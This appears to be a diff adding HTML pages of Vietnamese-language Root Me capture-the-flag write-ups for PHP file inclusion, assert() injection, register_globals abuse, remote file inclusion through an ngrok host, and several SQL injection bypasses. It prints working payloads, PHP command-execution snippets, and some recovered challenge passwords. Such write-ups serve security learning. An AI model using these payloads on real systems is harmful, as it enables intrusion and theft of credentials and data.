+<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image7.png" alt="" /></p>
+<p>Flag xuất hiện trong <strong>conf.inc.php</strong>:</p>
+<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image8.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="local-file-inclusion---wrappers"><a class="header" href="#local-file-inclusion---wrappers"><a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers">Local File Inclusion - Wrappers</a></a></h1>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image1.png" alt="" /></p>
+<p>Khi thử upload without source, ta nhận được message:</p>
+<blockquote>
+<p>"Sorry, only JPG images will be accepted. Please use a different service if you do not intend to upload pictures”</p>
+</blockquote>
+<p>Đề bài gợi ý là Wrapper, ta chú ý đến PHP Wrapper. Dó đó thử dụng <code>php://filter</code> để get source <strong>index.php</strong> nhưng không khả thi:</p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image2.png" alt="" /></p>
+<p>Sử dụng data wrapper thì bị nhận diện attack còn sử dụng encode base64 thì nhận được lỗi <strong>“page name too long”</strong>:</p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image3.png" alt="" /></p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image4.png" alt="" /></p>
+<p>Đến đây, chắc có lẽ ta cần sử dụng cổng upload này để upload command lên server, sau đó, dùng wrapper để chạy file. Ta sử dụng đến wrapper <strong>zip://</strong> để đọc file từ zip vì có lẽ server chặn các cổng data mất rồi:</p>
+<p>Code <code>getsource.php</code>:</p>
+<pre><code class="language-html">&lt;pre&gt;&lt;?php show_source('index.php'); ?&gt;&lt;/pre&gt;;
+</code></pre>
+<p>Ta đặt tên là <strong>getsource.php</strong>, sau đó zip file lại <strong>getsource.zip</strong>, rename <strong>getsource.jpg</strong> , sau đó upload lên server:</p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image5.png" alt="" /></p>
+<p>Chú ý đến cấu trúc URL: <a href="http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&amp;id=8Gjbt40un">http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&amp;id=8Gjbt40un</a></p>
+<p>Lúc này, page đang load một filename có id là <strong>8Gjbt40un</strong> khác với image name của ta Server đã upload lên <code>/tmp/upload/image_id.jpg</code>. Sử dụng zip wrapper tuy cập đến <strong>/tmp/upload/8Gjbt40un.jpg%23getsource</strong>, server sẽ tự concat thêm ‘.php’ cho ta để có câu request hoàn chỉnh:</p>
+<p><em>?page=zip://tmp/upload/8Gjbt40un.jpg%23getsource</em>*.php***</p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image6.png" alt="" /></p>
+<p>Tuy nhiên, ta lại nhận được lỗi tên quá dài. Ta cần rename lại thành t.php t.zip t.jpg, sau đó upload lại:</p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image7.png" alt="" /></p>
+<p><em><strong>Payload:</strong> ?page=zip://tmp/upload/XoMA4xJDj.jpg%23</em><em>t.php</em>**</p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image8.png" alt="" /></p>
+<p>Source không có thông tin gì liên quan đến password cả, giờ thì ta phải thử tìm trong folder chứ index.php vì có thể sẽ có file khác nhưng ta không Path Traversal đc:</p>
+<p><strong>Payload:</strong> <code>&lt;pre&gt;&lt;?php shell_exec('ls -la') ?&gt;&lt;/pre&gt;;</code></p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image9.png" alt="" /></p>
+<p><code>shell_exec()</code> bị block. Ta thử với:</p>
+<p><strong>Payload:</strong> <code>&lt;pre&gt;&lt;?php system('ls -la') ?&gt;&lt;/pre&gt;;</code></p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image10.png" alt="" /></p>
+<p><code>system()</code> cũng bị block. Ta thử với <code>exec()</code> nhưng cũng bị block:</p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image11.png" alt="" /></p>
+<p>Không còn cách nào khác, ta sử dụng <code>scandir()</code> để list all file trong director:</p>
+<pre><code class="language-php">&lt;pre&gt;
+&lt;?php
+$path = './';
+$files = scandir($path);
+
+foreach($files as $file) {
+    echo "&lt;a href='$file'&gt;$file&lt;/a&gt;";
+}
+?&gt;
+&lt;/pre&gt;;
+</code></pre>
+<p>Xong, nó list all ra được và ta có thể thấy được flag:</p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image12.png" alt="" /></p>
+<p>Đọc file flag với:</p>
+<p><code>&lt;pre&gt;&lt;?php show\_source('flag-mipkBswUppqwXlq9ZydO.php'); ?&gt;&lt;/pre&gt;;</code></p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image13.png" alt="" /></p>
+<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image14.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="php---assert"><a class="header" href="#php---assert"><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-assert">PHP - assert()</a></a></h1>
+<p>Thử fuzz với payload: <code>http://challenge01.root-me.org/web-serveur/ch47/?page=../</code></p>
+<p><img src="PHP/PHP-assert()/./media/image1.png" alt="" /></p>
+<p>Website sử dụng <code>assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");</code> để check xem yêu cầu tìm xem có file hay không, nếu lỗi thì hiện message. Như vậy, ta cần injecton hàm assert này. Tra cheat sheet ta có thể nhét BOOLEAN kèm theo để buộc thực thi với <strong>die()</strong> và để hiển thị source bằng hàm <code>show_source()</code>: <code>and die(show_source('.passwd')) or '</code></p>
+<p>Lúc này payload có dạng:</p>
+<p><code>assert("strpos(' ' and die(show\_source('.passwd')) or ' ', '..') === false") or die("Detected hacking attempt!");</code></p>
+<p><strong>Payload:</strong> <code>http://challenge01.root-me.org/web-serveur/ch47/?page=%27%20and%20die(show_source(%27.passwd%27))%20or%20%27</code></p>
+<p><img src="PHP/PHP-assert()/./media/image2.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="php---filters"><a class="header" href="#php---filters"><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters">PHP - Filters</a></a></h1>
+<p>Test payload trực tiếp đến <code>/etc/passwd</code> thì nhận được lỗi ràng buộc với <code>/etc/passwd</code>.</p>
+<p><img src="PHP/PHP-Filters/./media/image1.png" alt="" /></p>
+<p>Thật ra URL không filter keyword của mình nhưng mà không thể nào get nó theo cách này được. Chuyển qua dùng wrapper php với base64 để get source index.php:</p>
+<p><img src="PHP/PHP-Filters/./media/image2.png" alt="" /></p>
+<p><img src="PHP/PHP-Filters/./media/image3.png" alt="" /></p>
+<p>Get source <strong>ch12.php</strong>:</p>
+<p><img src="PHP/PHP-Filters/./media/image4.png" alt="" /></p>
+<p><img src="PHP/PHP-Filters/./media/image5.png" alt="" /></p>
+<p>Vậy là website có <code>config.php</code>, get source <code>config.php</code>:</p>
+<p><img src="PHP/PHP-Filters/./media/image6.png" alt="" /></p>
+<p><img src="PHP/PHP-Filters/./media/image7.png" alt="" /></p>
+<pre><code class="language-yaml">Username: admin
+Password: DAPt9D2mky0APAF
+</code></pre>
+<p><img src="PHP/PHP-Filters/./media/image8.png" alt="" /></p>
+<p><img src="PHP/PHP-Filters/./media/image9.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="php--register-globals"><a class="header" href="#php--register-globals"><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-register-globals">PHP – register globals</a></a></h1>
+<p>Theo document, ta có các global variable thường gặp là: <code>_REQUEST</code>, <code>_SESSION</code>, <code>_SERVER</code>, <code>_ENV</code>, <code>_FILES</code>. Kiểm tra cookie của website, ta có thể thấy được PHP Session ID. Từ đó, ta có thể đoán được website có thể sử dụng <code>_SESSION</code> để lưu trữ mảng các session (<a href="https://www.php.net/manual/en/reserved.variables.session.php">PHP: $_SESSION - Manual</a>).</p>
+<p><img src="PHP/PHP-registerglobal/./media/image1.png" alt="" /></p>
+<p>Thử bằng payload với <code>/index.php?_SESSION[logged]=1</code>, ta tìm được password:</p>
+<p><img src="PHP/PHP-registerglobal/./media/image2.png" alt="" /></p>
+<pre><code class="language-yaml">Password: **NoTQYipcRKkgrqG**
+</code></pre>
+<p><img src="PHP/PHP-registerglobal/./media/image3.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion"><a href="https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion">Remote File Inclusion</a></a></h1>
+<p>Website có thiết lập parameter <code>?lang</code> để đọc source từ lang.php:</p>
+<p><img src="PHP/RemoteFileInclusion/./media/image1.png" alt="" /></p>
+<p>Fuzz vào URL thì ta biết được, server sẽ tự động concat thêm <code>_lang.php</code> vào cuối keyword ta gán vào <code>?lang</code>:</p>
+<p><img src="PHP/RemoteFileInclusion/./media/image2.png" alt="" /></p>
+<p>Challenge này thử thách về RFI, ta thử chèn một website bất kỳ vào <code>?lang</code>:</p>
+<p><img src="PHP/RemoteFileInclusion/./media/image3.png" alt="" /></p>
+<p>Như ban nãy, server tự concat thêm <code>_lang.php</code>, ta sử dụng <code>?</code> để bypass phần concat với payload: <code>http://challenge01.root-me.org/web-serveur/ch13/?lang=https://github.com/nh4ttruong?</code></p>
+<p><img src="PHP/RemoteFileInclusion/./media/image4.png" alt="" /></p>
+<p>Bypass thành công, giờ thì ta sử dụng server để RFI qua challenge này. Set-up một file tên là <strong>ntruong.txt</strong> với content là payload PHP:</p>
+<p><img src="PHP/RemoteFileInclusion/./media/image5.png" alt="" /></p>
+<p>Sử dụng ngrok server để public IP Address:</p>
+<p><img src="PHP/RemoteFileInclusion/./media/image6.png" alt="" /></p>
+<p>URL để RFI: <code>https://f512-14-241-170-199.ap.ngrok.io/ntruong.txt</code></p>
+<p><img src="PHP/RemoteFileInclusion/./media/image7.png" alt="" /></p>
+<p>Giờ thì gắn vào <code>?lang</code> ta được:</p>
+<p><img src="PHP/RemoteFileInclusion/./media/image8.png" alt="" /></p>
+<pre><code class="language-yaml">Password: R3m0t3_iS_r3aL1y_********************
+</code></pre>
+<p><img src="PHP/RemoteFileInclusion/./media/image9.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection-challenges"><a class="header" href="#sql-injection-challenges">SQL Injection Challenges</a></h1>
+<p>Welcome to the <strong>SQL Injection</strong> category of Root Me write-ups! This section provides detailed, educational solutions to a variety of SQL Injection (SQLi) challenges from the Root Me platform. Each write-up is designed to help you understand different SQLi techniques, bypasses, and real-world exploitation scenarios.</p>
+<hr />
+<h2 id="-list-of-challenges"><a class="header" href="#-list-of-challenges">📝 List of Challenges</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
+<tr><td>SQL injection - Authentication GBK</td><td><a href="SQL-Injection/./SQLinjection-AuthenticationGBK/SQLinjection-AuthenticationGBK.html">Read more</a></td></tr>
+<tr><td>SQL injection - Authentication</td><td><a href="SQL-Injection/./SQLinjection-Authentication/SQLinjection-Authentication.html">Read more</a></td></tr>
+<tr><td>SQL injection - error based</td><td><a href="SQL-Injection/./SQLinjection-errorbased/SQLinjection-errorbased.html">Read more</a></td></tr>
+<tr><td>SQL injection - File reading</td><td><a href="SQL-Injection/./SQLinjection-Filereading/SQLinjection-Filereading.html">Read more</a></td></tr>
+<tr><td>SQL injection - Insert</td><td><a href="SQL-Injection/./SQLinjection-Insert/SQLinjection-Insert.html">Read more</a></td></tr>
+<tr><td>SQL injection - Routed</td><td><a href="SQL-Injection/./SQLinjection-Routed/SQLinjection-Routed.html">Read more</a></td></tr>
+<tr><td>SQL injection - Time-based</td><td><a href="SQL-Injection/./SQLinjection-Time-based/SQLinjection-Time-based.html">Read more</a></td></tr>
+<tr><td>SQL injection numeric</td><td><a href="SQL-Injection/./SQLinjectionnumeric/SQLinjectionnumeric.html">Read more</a></td></tr>
+<tr><td>SQL injection string</td><td><a href="SQL-Injection/./SQLinjectionstring/SQLinjectionstring.html">Read more</a></td></tr>
+<tr><td>SQL Truncation</td><td><a href="SQL-Injection/./SQLTruncation/SQLTruncation.html">Read more</a></td></tr>
+<tr><td>SQL injection - Filter bypass</td><td><a href="SQL-Injection/./SQLinjection-Filterbypass/SQLinjection-Filterbypass.html">Read more</a></td></tr>
+</tbody></table>
+</div>
+<hr />
+<h2 id="-feedback"><a class="header" href="#-feedback">📢 Feedback</a></h2>
+<p>Feel free to open an issue or submit a pull request for suggestions or improvements!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---authentication"><a class="header" href="#sql-injection---authentication"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication">SQL injection - Authentication</a></a></h1>
+<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image1.png" alt="" /></p>
+<p>Thử với payload:</p>
+<pre><code class="language-yaml">Username: `1’--`
+Password: `1`
+</code></pre>
+<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image2.png" alt="" /></p>
+<p>Như vậy, ta không thể inject được vào input. Thử inject vào password:</p>
+<pre><code class="language-yaml">Username: `1`
+Password: `1’ or 1=1--`
+</code></pre>
+<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image3.png" alt="" /></p>
+<p>Ta có thể đoán được, có vẻ như cần phải có username chính xác mới có thể inject được ở username, thử kiểm chứng bằng cách inject ở username với payload <code>user1—</code>.</p>
+<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image3.png" alt="" /></p>
+<p>Như vậy, để trộm được password của admin, ta cần phải biết username của admin để thực hiện inject. Và nhờ informations hiển thị của user1, ta có thể đoán username của admin có thể là <strong>admin</strong> hoặc <strong>administrator.</strong></p>
+<p><strong>Thử với payload:</strong></p>
+<pre><code class="language-yaml">-   Username: `admin’--`
+-   Password: `1`
+</code></pre>
+<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image4.png" alt="" /></p>
+<p>Inspect và tìm được password của admin:</p>
+<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image5.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---authentication---gbk"><a class="header" href="#sql-injection---authentication---gbk"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication-GBK">SQL injection - Authentication - GBK</a></a></h1>
+<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image1.png" alt="" /></p>
+<p>Thử với các payload như bài <strong>SQLi Authenticaiton</strong> thì mọi thứ đã không qua được:</p>
+<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image2.png" alt="" /></p>
+<p>Thử đổi payload sang l<code>ogin[]=admin&amp;password[]=1</code>, ta nhận được thông báo lỗi sau:</p>
+<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image3.png" alt="" /></p>
+<p>Từ đó, ta có thể đoán được password sẽ dùng md5 đã hash và username sử dụng addslashes() để encoding input. Hàm <a href="https://www.php.net/manual/en/function.addslashes.php">PHP: addslashes - Manual</a> sẽ chèn thêm <code>\</code> trước các ký tự đóng ngoặc đơn để tránh SQL. Từ đó, ta chỉ cần bypass username qua addslashes là có thể SQLi thành công.</p>
+<p>Theo GBK, nó sẽ thực hiện mã encoding các ký tự hex về tiếng Trung. Bên cạnh đó, nó sẽ encode 2 bytes hex về 1 ký tự tiếng Trung và tuân theo quy luật (<a href="https://en.wikipedia.org/wiki/GBK_(character_encoding)">GBK (character encoding) - Wikipedia</a>):</p>
+<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image4.png" alt="" /></p>
+<p>Do đó, ta có thể lợi dụng điều này để khiến server tự động thêm “\” vào input (1 byte) vào input và từ đó khiến nó trở thành 1 ký tự tiếng Trung:</p>
+<ul>
+<li>Ký tự <code>\</code> có mã hex là <code>%5C</code> (phù hợp với luận ở byte thứ 2)</li>
+<li>Vì luật quy định byte đầu tiên trong khoảng <strong>81 – FE</strong>, do đó ta chọn byte đầu là<code> %81</code></li>
+<li>Ta có ký tự hoàn chỉnh sau khi nhập <code>%81</code> vào sẽ được convert sang <code>%81%5c</code> ~ <code>乗</code></li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image5.png" alt="" /></p>
+<p>Giờ đến việc inject username, ta thử với payload: <code>login=admin%81'+or+1=1--+-&amp;password=1</code></p>
+<p>Dự đoán, server sẽ convert nó thành: <code>login=admin%81%5C'+or+1=1--+-&amp;password=1</code></p>
+<p>Hay: <code>login=admin乗'+or+1=1--+-&amp;password=1</code></p>
+<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image6.png" alt="" /></p>
+<p>Sau khi send request, Burp hiển thị Redirection, click vào thì hiển thị flag:</p>
+<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image7.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---blind"><a class="header" href="#sql-injection---blind"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-blind">SQL Injection - Blind</a></a></h1>
+<p>Thử fuzz với payload <code>admin’-- -</code> ta đã access thành công qua Authentication v 0.02. Tuy vậy, website chẳng trả về cho thông tin password gì cả:</p>
+<p><img src="SQL-Injection/SQLinjection-Blind/./media/image1.png" alt="" /></p>
+<p>Mở burpsuite và tìm kiếm thôi. Thử thay đổi payload bằng cách sử dụng union select thì phát hiện ra website đã filter các keyword chông SQL Injection với thông báo <strong>“Injection detected”</strong>:</p>
+<p><img src="SQL-Injection/SQLinjection-Blind/./media/image2.png" alt="" /></p>
+<p>Với blind injection, ta thực hiện mò thử với các cấu trúc mà server database hay tạo, fuzz thôi:</p>
+<p><img src="SQL-Injection/SQLinjection-Blind/./media/image3.png" alt="" /></p>
+<p>Với payload:</p>
+<p><code>username=admin%27+AND+(select+username+from+sqlite_master)='admin'--+-&amp;password=admin%27--+-</code></p>
+<p>Server trả về là TRUE fuzz tìm password bằng substr() thôi!</p>
+<ol>
+<li><strong>Tìm length(password):</strong></li>
+</ol>
+<p><img src="SQL-Injection/SQLinjection-Blind/./media/image4.png" alt="" /></p>
+<ul>
+<li>Length(password) == 8</li>
+</ul>
+<ol>
+<li><strong>Tìm password:</strong></li>
+</ol>
+<p>Payload để fuzz:</p>
+<p><em>username=admin%27+AND+substr((select+password+from+sqlite_master),1,1)='a'--+-&amp;password=admin%27--+-</em></p>
+<p><img src="SQL-Injection/SQLinjection-Blind/./media/image5.png" alt="" /></p>
+<p>Sau một khoảng thời gian, ta đã ghép được <code>password: e2a*********3i</code></p>
+<p><img src="SQL-Injection/SQLinjection-Blind/./media/image6.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---error"><a class="header" href="#sql-injection---error"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error">SQL injection - Error</a></a></h1>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image1.png" alt="" /></p>
+<p>Website cung cấp cho ta 2 tab (Authentication và Contents), tuy vậy, khi fuzz SQLi vào Authentication thì không có kết quả khả thi. Chuyển qua tab Contents, ta phát hiện ra website sẽ res về lỗi cho ta:</p>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image2.png" alt="" /></p>
+<p>Thử fuzz các payload dựa vào <code>“ORDER BY”</code>:</p>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image3.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image4.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image5.png" alt="" /></p>
+<p>Có thể thấy, với <code>position==3</code> hoặc <code>VARCHAR/CHAR</code> type thì database res về lỗi. Như vậy, ta cần phải hiết 3 position của database này cũng như dựa vào type varibles để attack. Dựa vào cheatsheet của MySQL, ta có thể sử dụng <code>CAST … AS [type]</code> để khiến database res về error khi postion không thể là <code>VARCHAR/CHAR</code>. Mở burpsuite và thử payload:</p>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image6.png" alt="" /></p>
+<p>Lỗi res về cho ta biết, website sẽ chỉ hiển thị 1 row. Đến đây, ta có thể sử dụng LIMIT để filter res về 1 row:</p>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image7.png" alt="" /></p>
+<ul>
+<li>Table name: <code>m3mbr35t4bl3</code></li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image8.png" alt="" /></p>
+<ul>
+<li>Column name (first column): <code>id</code></li>
+</ul>
+<p>Đến đây, ta cần sử dụng OFFSET để có thể filter vào đúng postion ta cần LIMIT để hiển thị các column còn lại:</p>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image9.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image10.png" alt="" /></p>
+<ul>
+<li>Username column: <code>us3rn4m3_c0l</code></li>
+<li>Password column: <code>p455w0rd_c0l</code></li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image11.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image12.png" alt="" /></p>
+<ul>
+<li>Username của admin: <code>admin</code></li>
+<li>Password của admin: <code>1a2BdKT5DIx3qxQN3UaC</code></li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image13.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection--file-reading"><a class="header" href="#sql-injection--file-reading"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-file-reading">SQL injection – File reading</a></a></h1>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image1.png" alt="" /></p>
+<p>Ở tab Members, ta tìm được thông tin cơ bản của admin. Từ đây, thử fuzz với URL bằng burpsuite để tìm kiếm điều khác biệt:</p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image2.png" alt="" /></p>
+<p>Bắt đầu tìm kiếm số cột:</p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image3.png" alt="" /></p>
+<ul>
+<li>Có 4 cột</li>
+</ul>
+<p>Sau một hồi fuzz, ta đã tìm được các bảng của dtb:</p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image4.png" alt="" /></p>
+<p>Payload: <code>id=1+and+0=1+union+select+group_concat(table_name),1,1,1+from+information_schema.tables--+-</code></p>
+<p>Ta thấy, có table <code>‘member’</code>, tiến hành tìm column của nó. Tuy nhiên, dtb đã filter mất tiêu:</p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image5.png" alt="" /></p>
+<p>Thử convert <code>‘member’</code> hex value: <code>0x6D656D626572</code></p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image6.png" alt="" /></p>
+<ul>
+<li><code>member_id,member_login,member_password,member_email</code></li>
+</ul>
+<p>Tìm password thôi. Tuy nhiên, đến lúc này database k constaint table_name nữa, ta có payload: <code>id=1+and+0=1+union+select+member_login,member_password,1,1+from+member</code></p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image7.png" alt="" /></p>
+<p>Đến đây, ta nhận được một chuỗi base64 nhưng decode ra không phải password. Sau khi mò mẫm vô ích, nhìn lại tên bài là file reading, ta có thể đoán rằng, tất cả sẽ nằm trong source code tại index.php. Ta sẽ sử dụng sqlmap để tìm ra source web:</p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image8.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image9.png" alt="" /></p>
+<p>Source code cho ta thấy, password đã bị hash bằng <strong>SHA1</strong>, sau đó bị <strong>stringxor</strong> với base64 của chính nó.</p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image10.png" alt="" /></p>
+<p>Giờ thì hiểu nó rồi, ta sử dụng python để stringxor ngược lại thành SHA1:</p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image11.png" alt="" /></p>
+<ul>
+<li>SHA1 password: <code>77be4fc97f77f5f48308942bb6e32aacabed9cef</code></li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image12.png" alt="" /></p>
+<ul>
+<li>Password: <code>supe*********word</code></li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image13.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image14.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection--filter-bypass"><a class="header" href="#sql-injection--filter-bypass">S<a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass">QL Injection – Filter bypass</a></a></h1>
+<p>Challenge này có cấu trúc tương tự các bài SQL đã làm, tab Membres có câu query <code>id=1</code> và chỉ có ở đây có thể tiêm payload vào. Tuy vậy, đời không như là mơ, ta bị reject:</p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image1.png" alt="" /></p>
+<p>Mở burpsuite lên và thử fuzz tìm filter của nó thôi!</p>
+<p>Với comment của tác giả, ta đã xác định được database gồm 4 cột:</p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image2.png" alt="" /></p>
+<p>Sau 20 phút ngồi fuzz không thành, thôi thì bỏ vào intruder để brute thử:</p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image3.png" alt="" /></p>
+<p>Có vẻ là server đã chặn hết các từ khóa luôn. Stuck tiếp 1 tiếng. Thử test lại với uppercase các keyword thì thấy qua được filter:</p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image4.png" alt="" /></p>
+<ul>
+<li>Uppercase các keyword</li>
+</ul>
+<p>Đời không như là mơ, đến lúc này, server filter hết các ký tự <strong>“+”</strong>, <strong>“%20”</strong> và <strong>“whitespace”</strong>:</p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image5.png" alt="" /></p>
+<p>Stackoverflow bảo hãy thử các ký tự <strong>/</strong>/ %00 %09 %0a %0d** để bypass. Thì thấy <code>%00</code> bypass được:</p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image6.png" alt="" /></p>
+<p>Tuy nhiên, tiếp tục fuzz với <code>%00</code> thì vẫn không có kết quả gì trả về:</p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image7.png" alt="" /></p>
+<p>Quay ngược lại thử %09 (vì lúc thử đến <code>%00</code> bypass được nên không thử nữa) thì thấy cũng bypass được. Tra trên URL Encoding thì biết đây là ký tự Tab:</p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image8.png" alt="" /></p>
+<p>Ngồi fuzz và ta đã có payload có thể tiêm:
+<code>1%09UNION%09SELECT%09*%09FROM%09membres%09LIMIT%091%09OFFSET%090</code></p>
+<p>Ở trên, ta đã biết được 4 cột của database. Giờ thì thử thách tiếp theo là bypass dấu <strong>‘,’</strong>. Tuy nhiên, có vẻ như không có cách nào thay thế được dấu ‘,’ cả.</p>
+<p>Sau khi lượn trên các mặt trận, em tìm được cấu trúc query sử dụng cross join để JOIN multi query trong subqueries để có thể truy xuất nhiều cột không cần sử dụng <strong>‘comma’</strong>:
+<code>union select * from ((select 1)A join (select 2)B join (select group_concat(user(),' ',database(),' ',@@datadir))C);</code></p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image9.png" alt="" /></p>
+<p>Thử áp dụng payload trên và các lưu ý từ đầu, ta có payload:
+<code>1 UNION SELECT * FROM (SELECT 123) AS a JOIN (SELECT 456) AS b JOIN (SELECT 123) AS c JOIN (SELECT pass FROM membres LIMIT 1) AS d) LIMIT 1 OFFSET 0</code></p>
+<p>Payload để tiêm:
+<code>1%09UNION%09SELECT%09*%09FROM%09((SELECT%09123)%09AS%09a%09JOIN%09(SELECT%09456)%09AS%09b%09JOIN%09(SELECT%09123)%09AS%09c%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)%09AS%09d)%09LIMIT%091%09OFFSET%090</code></p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image10.png" alt="" /></p>
+<p>Không hiểu sao nó chỉ trả về giá trị như lúc đầu tiêm. Ngồi stuck một hồi nữa và thử đổi payload thì mới phát hiện ra quên thay đổi OFFSET từ 0 1 vì mình đã query id=1. Thay đổi payload:
+<code>1%09UNION%09SELECT%09*%09FROM%09((SELECT%09123)%09AS%09a%09JOIN%09(SELECT%09456)%09AS%09b%09JOIN%09(SELECT%09123)%09AS%09c%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)%09AS%09d)%09LIMIT%091%09OFFSET%091</code></p>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image11.png" alt="" /></p>
+<ul>
+<li>Tìm được password: <strong>KLfgy</strong>**************<strong>sqli</strong></li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image12.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
